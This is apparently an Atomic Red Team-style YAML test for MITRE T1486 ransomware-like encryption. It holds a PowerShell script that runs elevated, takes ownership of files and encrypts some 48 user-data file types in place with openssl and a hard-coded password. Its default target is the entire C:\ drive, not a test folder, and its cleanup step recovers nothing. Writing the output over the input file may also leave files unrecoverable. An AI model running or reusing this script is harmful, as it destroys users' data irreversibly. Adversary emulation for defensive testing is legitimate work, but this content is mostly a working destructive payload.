attack_technique: T1486
display_name: Data Encrypted for Impact (In-Place Encryption)
atomic_tests:
  - name: Encrypt files recursively in a test folder
    auto_generated_guid: custom-guid-1234567890abcdef
    description: |
      This test encrypts all files in the specified directory in place using a strong password.
      WARNING: THIS IS A DESTRUCTIVE ACTION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
    supported_platforms:
      - windows
    input_arguments:
      encryption_password:
        description: Password to use for encryption
        type: string
        default: ChaymaOumayma2025
      target_directory:
        description: Directory to encrypt files from
        type: path
        default: "C:\\"
      target_extensions:
        description: List of file extensions to target for encryption
        type: array
        default:
          - ".doc"
          - ".docx"
          - ".xls"
          - ".xlsx"
          - ".ppt"
          - ".pptx"
          - ".pdf"
          - ".txt"
          - ".rtf"
          - ".jpg"
          - ".jpeg"
          - ".png"
          - ".bmp"
          - ".gif"
          - ".tiff"
          - ".svg"
          - ".mp3"
          - ".wav"
          - ".aac"
          - ".flac"
          - ".m4a"
          - ".mp4"
          - ".avi"
          - ".mkv"
          - ".mov"
          - ".wmv"
          - ".zip"
          - ".rar"
          - ".7z"
          - ".tar"
          - ".gz"
          - ".mdb"
          - ".accdb"
          - ".sql"
          - ".db"
          - ".sqlite"
          - ".psd"
          - ".ai"
          - ".cpp"
          - ".java"
          - ".py"
          - ".js"
          - ".html"
          - ".json"
          - ".xml"
          - ".yml"
          - ".bak"
          - ".log"
    dependency_executor_name: powershell
    dependencies:
      - description: |
          Checks if openssl is installed
        prereq_command: |
          if (Get-Command openssl -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
        get_prereq_command: |
          Write-Host "Installing OpenSSL..."
          Invoke-WebRequest "https://slproweb.com/download/Win64OpenSSL_Light-3_2_1.exe" -OutFile "$env:TEMP\\openssl-installer.exe"
          Start-Process "$env:TEMP\\openssl-installer.exe" -ArgumentList "/S" -Wait
          # Validate installation
          if (-Not (Get-Command openssl -ErrorAction SilentlyContinue)) {
              Write-Host "OpenSSL installation failed."
              exit 1
          }
    executor:
      name: powershell
      elevation_required: true
      command: |
        $password = "#{encryption_password}"
        $targetDir = "#{target_directory}"
        $targetExtensions = "#{target_extensions}".Split(",")

        # Convert extensions to a format suitable for PowerShell filtering
        $includeClause = $targetExtensions | ForEach-Object { "*$_" } -join ","

        # Validate target directory
        if (-Not (Test-Path $targetDir)) {
            Write-Host "‚ùå The target directory $targetDir does not exist."
            exit 1
        }

        Write-Host "‚úÖ Starting encryption process..."

        # Encrypt files recursively
        Get-ChildItem -Path $targetDir -Recurse -Include $includeClause -ErrorAction SilentlyContinue | ForEach-Object {
            $file = $_.FullName

            # Log the current file being processed
            Write-Host "üîç Processing file: $file"

            # Take ownership and modify permissions
            try {
                takeown /F $file /A
                icacls $file /grant Administrators:F /T /C
                Write-Host "üîë Permissions modified successfully for: $file"
            } catch {
                Write-Host "‚ùå Failed to modify permissions for file: $file"
                return
            }

            # Encrypt the file in place with OpenSSL
            Write-Host "üîí Encrypting file in place: $file"
            openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $file -pass pass:$password
            
            if ($LASTEXITCODE -eq 0) {
                Write-Host "‚úÖ Successfully encrypted file in place: $file"
            } else {
                Write-Host "‚ùå Failed to encrypt: $file"
            }
        }

        Write-Host "‚úÖ Encryption process completed!"
      cleanup_command: |
        Write-Host "No cleanup performed. Original files have been encrypted in place."
        Write-Host "To recover encrypted files, use the decryption password provided."
